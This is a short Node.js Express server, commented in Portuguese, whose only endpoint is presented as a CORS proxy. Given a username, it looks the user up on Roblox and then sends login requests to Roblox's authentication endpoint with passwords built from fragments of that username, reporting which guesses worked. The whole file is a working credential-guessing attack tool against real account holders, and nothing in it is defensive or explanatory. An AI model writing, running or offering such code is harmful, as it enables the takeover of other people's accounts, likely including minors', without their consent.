const express = require('express');
const axios = require('axios');
const app = express();
app.use(express.json());

// Proxy para evitar CORS
app.post('/api/proxy', async (req, res) => {
    try {
        const { username } = req.body;
        
        // Obter dados do usuário
        const userData = await axios.get(
            `https://api.roblox.com/users/get-by-username?username=${username}`
        );
        
        if (userData.data.Id) {
            // Testar senhas
            const passwordAttempts = [
                username.slice(0, 4),
                username.slice(4),
                username.slice(0, 2) + username.slice(-2)
            ];
            
            const results = [];
            for (const password of passwordAttempts) {
                try {
                    const response = await axios.post(
                        'https://auth.roblox.com/v2/login',
                        { username, password },
                        { 
                            headers: { 
                                'Content-Type': 'application/json',
                                'User-Agent': 'Mozilla/5.0'
                            },
                            timeout: 5000
                        }
                    );
                    results.push({ password, success: true });
                } catch (error) {
                    results.push({ password, success: false, error: error.message });
                }
            }
            
            res.json({ success: true, results });
        } else {
            res.json({ success: false, message: 'Usuário não encontrado' });
        }
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

app.listen(process.env.PORT || 3000);
